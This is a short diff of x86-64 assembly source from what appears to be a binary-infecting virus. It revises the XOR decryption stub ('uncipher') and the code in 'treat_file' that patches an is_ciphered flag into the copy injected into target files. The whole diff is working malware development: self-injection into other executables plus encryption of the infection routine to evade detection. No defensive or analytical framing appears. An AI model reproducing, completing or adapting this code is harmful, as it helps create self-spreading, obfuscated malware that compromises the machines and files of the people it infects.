@@ -72,13 +72,12 @@ can_run_infection:
 ; void uncipher()
 uncipher:
 	; this value will be modified when injected in a binary
-	db 0xbf, 00, 00, 00, 00				; mov rdi, 0x0 => data = 0x0
-	cmp rdi, 0x0					; if (data == 0x0)
+	db 0xbf, 00, 00, 00, 00				; mov rdi, 0x0 => is_ciphered = 0
+	cmp rdi, 0x0					; if (is_ciphered == 0x0)
 	je .end						; 	goto .end;
 
-	mov rax, rdi					; infection_routine_offset = data
-	lea rdi, [rel begin]				; data = begin
-	add rdi, rax					; data += infection_routine_offset
+	lea rdi, [rel begin]				; data = begin addr
+	add rdi, infection_routine - begin		; data += infection_routine - begin
 
 	mov rsi, cipher_stop - infection_routine	; size = cipher_stop - infection_routine
 	lea rdx, [rel key]				; key = key
@@ -416,13 +415,13 @@ treat_file:
 	lea rdx, [rel key]				; key = key
 	call xor_cipher					; xor_cipher(data, size, key)
 
-	; change cipher address in injected code (uncipher)
-	mov eax, infection_routine - begin		; infection_routine_offset = infection_routine - begin;
-	mov rdi, [mappedfile]				; uncipher_ptr = file_map + filesize + (uncipher - begin);
+	; change is_ciphered flag in injected code
+	mov rdi, [mappedfile]				; is_ciphered_ptr = file_map + filesize + (uncipher - begin);
 	add rdi, [filesize]				;
 	add rdi, uncipher - begin			;
 	inc rdi						; 	+ 1;
-	mov [rdi], eax					; *uncipher_ptr = infection_routine_offset;
+	mov eax, 0x1					; flag = 1;
+	mov [rdi], eax					; *is_ciphered_ptr = flag;
 
 
 .unmap_file:
